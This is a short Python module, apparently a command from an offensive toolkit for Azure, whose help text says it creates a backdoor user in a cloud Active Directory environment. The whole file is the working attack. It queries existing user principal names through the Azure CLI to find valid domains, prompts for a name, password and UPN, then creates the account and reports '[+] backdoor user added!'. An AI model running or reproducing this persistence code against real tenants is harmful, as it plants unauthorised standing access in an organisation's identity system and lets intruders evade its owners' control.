import subprocess
import json
import pprint

def start(args):
	help_str = "usage:\n\texec pers_user_create ---> creates a backdoor user into the cloud AD environment"
	if(len(args)>0):
		if(args[0][0] == "?"):
			print(help_str)
			return
	
	user_upns = subprocess.run(['az', 'ad', 'user', 'list', '--query', '[].{upn:userPrincipalName} '], stdout=subprocess.PIPE)
	user_upns_json_obj = json.loads(user_upns.stdout.decode('utf-8'))

	#pprint.pprint(user_upns_json_obj)
	print("[+] getting valid domains [+]")
	valid_domains = []
	for upn in user_upns_json_obj:
		#print(upn['upn'])
		index = upn['upn'].index('@')
		domain = upn['upn'][index+1:]
		if domain not in valid_domains:
			valid_domains.append(domain)

	display_name = input("enter a display name for the user: ")
	password = input("enter a password for the user: ")

	print("the valid domains are: ")
	for i in range(len(valid_domains)):
		print(valid_domains[i])

	upn = input("enter a valid UPN using one of the domain names: ")

	user_add = subprocess.run(['az', 'ad', 'user', 'create', '--display-name', display_name, '--password', password, '--user-principal-name', upn], stdout=subprocess.PIPE)
	if(user_add.returncode == 0):
		print("[+] backdoor user added!", upn, "is now an AD user [+]")
	else:
		print("[-] some error ocurred that did not allow the creation of an AD user [-]")
	


